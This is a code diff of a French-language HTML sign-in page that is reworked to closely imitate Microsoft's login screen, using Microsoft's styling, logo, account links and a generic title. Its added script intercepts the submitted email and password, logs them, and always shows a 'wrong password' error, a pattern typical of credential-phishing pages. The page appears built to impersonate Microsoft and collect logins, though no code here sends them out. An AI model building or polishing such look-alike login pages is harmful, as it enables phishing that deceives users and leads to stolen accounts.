@@ -3,87 +3,272 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion à Microsoft Office 365</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Se connecter à votre compte</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f2f2f2;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
+            color: #323130;
         }
+        
         .login-container {
-            background-color: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            padding: 40px;
+            background-color: white;
+            padding: 44px;
+            max-width: 440px;
             width: 100%;
-            max-width: 400px;
-            text-align: center;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            margin: 0 24px;
         }
-        .logo {
-            margin-bottom: 30px;
+        
+        .microsoft-logo {
+            margin-bottom: 32px;
+            text-align: left;
+            margin-left: -40px;
         }
-        .logo img {
-            width: 120px;
+        
+        .logo-img {
+            width: 180px;
             height: auto;
+            max-height: 40px;
+            object-fit: contain;
         }
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 15px;
-            margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
+        
+        .sign-in-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #323130;
         }
-        button {
+        
+        .sign-in-subtitle {
+            font-size: 15px;
+            color: #605e5c;
+            margin-bottom: 24px;
+        }
+        
+        .input-group {
+            margin-bottom: 16px;
+        }
+        
+        .input-field {
             width: 100%;
-            padding: 12px 15px;
-            background-color: #0067b8;
+            height: 32px;
+            padding: 6px 12px;
+            border: 1px solid #605e5c;
+            font-size: 15px;
+            color: #323130;
+            background-color: white;
+            outline: none;
+            transition: border-color 0.1s ease;
+        }
+        
+        .input-field:focus {
+            border-color: #0078d4;
+            border-width: 2px;
+            padding: 5px 11px;
+        }
+        
+        .input-field::placeholder {
+            color: #605e5c;
+        }
+        
+        .forgot-password {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 24px;
+            display: inline-block;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .button-container {
+            margin-bottom: 24px;
+        }
+        
+        .sign-in-button {
+            background-color: #0078d4;
             color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        button:hover {
-            background-color: #00569f;
-        }
-        .options {
-            margin-top: 20px;
+            border: 1px solid #0078d4;
+            padding: 6px 12px;
+            min-width: 108px;
             font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            outline: none;
+            transition: background-color 0.1s ease;
         }
-        .options a {
-            color: #0067b8;
+        
+        .sign-in-button:hover {
+            background-color: #106ebe;
+            border-color: #106ebe;
+        }
+        
+        .sign-in-button:active {
+            background-color: #005a9e;
+            border-color: #005a9e;
+        }
+        
+        .sign-in-options {
+            border-top: 1px solid #edebe9;
+            padding-top: 24px;
+        }
+        
+        .create-account {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 16px;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .sign-in-methods {
+            font-size: 13px;
+        }
+        
+        .sign-in-methods a {
+            color: #0078d4;
             text-decoration: none;
         }
-        .options a:hover {
+        
+        .sign-in-methods a:hover {
             text-decoration: underline;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        
+        .checkbox {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+        
+        .checkbox-label {
+            font-size: 13px;
+            color: #323130;
+            cursor: pointer;
+        }
+        
+        .error-message {
+            color: #a80000;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 24px;
+                margin: 0 16px;
+            }
+            
+            .sign-in-title {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="logo">
-            <img src="/images/logos/office365-logo.png" alt="Microsoft Office Logo">
+        <div class="microsoft-logo">
+            <img src="/images/logos/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg" alt="Microsoft Office Logo" class="logo-img">
         </div>
-        <h2 class="text-2xl font-semibold mb-6">Connectez-vous</h2>
-        <form action="/login" method="POST">
-            <input type="email" name="email" placeholder="Adresse e-mail, téléphone ou Skype" required>
-            <input type="password" name="password" placeholder="Mot de passe" required>
-            <button type="submit">Se connecter</button>
+        
+        <h1 class="sign-in-title">Se connecter</h1>
+        <p class="sign-in-subtitle">à votre compte</p>
+        
+        <form id="loginForm" action="/login" method="POST">
+            <div class="input-group">
+                <input type="email" 
+                       class="input-field" 
+                       name="email" 
+                       placeholder="E-mail, téléphone ou nom Skype" 
+                       required
+                       autocomplete="username">
+                <div class="error-message" id="emailError">Veuillez entrer une adresse e-mail valide.</div>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" 
+                       class="input-field" 
+                       name="password" 
+                       placeholder="Mot de passe" 
+                       required
+                       autocomplete="current-password">
+                <div class="error-message" id="passwordError">Mot de passe incorrect. Réessayez.</div>
+            </div>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" class="checkbox" id="keepSignedIn" name="keepSignedIn">
+                <label for="keepSignedIn" class="checkbox-label">Maintenir la connexion</label>
+            </div>
+            
+            <div class="button-container">
+                <button type="submit" class="sign-in-button">Se connecter</button>
+            </div>
+            
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
         </form>
-        <div class="options">
-            <a href="#">Vous n’avez pas de compte ? Créez-en un !</a>
-            <br>
-            <a href="#">Vous ne pouvez pas accéder à votre compte ?</a>
+        
+        <div class="sign-in-options">
+            <a href="#" class="create-account">Créer un compte Microsoft</a>
+            
+            <div class="sign-in-methods">
+                <a href="#">Options de connexion</a>
+            </div>
         </div>
     </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            // Simulation d'une tentative de connexion
+            if (email && password) {
+                // Ici vous pourriez ajouter votre logique de connexion
+                console.log('Tentative de connexion:', { email, password });
+                
+                // Exemple de gestion d'erreur
+                setTimeout(() => {
+                    const passwordError = document.getElementById('passwordError');
+                    passwordError.style.display = 'block';
+                    setTimeout(() => {
+                        passwordError.style.display = 'none';
+                    }, 3000);
+                }, 500);
+            }
+        });
+        
+        // Amélioration de l'UX avec les champs de saisie
+        const inputs = document.querySelectorAll('.input-field');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentNode.querySelector('.error-message').style.display = 'none';
+            });
+        });
+    </script>
 </body>
 </html>
